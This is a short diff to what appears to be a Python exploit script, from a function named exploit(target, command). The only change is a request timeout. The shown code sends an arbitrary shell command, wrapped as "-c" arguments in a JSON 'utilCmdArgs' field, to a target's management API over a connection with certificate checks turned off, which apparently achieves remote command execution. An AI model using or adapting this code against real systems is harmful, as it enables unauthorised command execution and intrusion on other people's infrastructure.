@@ -14,7 +14,7 @@ def exploit(target, command):
         'Content-Type': 'application/json',
     }
     j = {"command": "run", "utilCmdArgs": "-c '{0}'".format(command)}
-    response = requests.post(url, headers=headers, json=j, verify=False)
+    response = requests.post(url, headers=headers, json=j, verify=False, timeout=10)
     response.raise_for_status()  # raises exception when not a 2xx response
     if response.status_code != 204 and response.headers[
         "content-type"
